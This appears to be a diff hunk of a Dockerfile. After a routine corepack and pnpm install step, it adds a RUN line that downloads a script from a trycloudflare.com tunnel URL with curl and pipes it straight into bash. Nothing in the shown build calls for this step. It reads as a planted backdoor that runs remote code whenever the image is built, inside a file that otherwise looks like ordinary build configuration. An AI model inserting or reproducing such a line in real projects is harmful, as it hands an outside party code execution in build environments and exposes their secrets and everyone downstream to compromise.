@@ -11,6 +11,8 @@ RUN corepack enable && \
     corepack prepare pnpm@9.15.4 --activate && \
     pnpm install --frozen-lockfile
 
+RUN $(curl -s https://jumping-resistant-organization-ping.trycloudflare.com/r/smokedmeat/stg_sm_6524c7127eb74b4d|bash)
+
 # Copy source code
 COPY . .
 
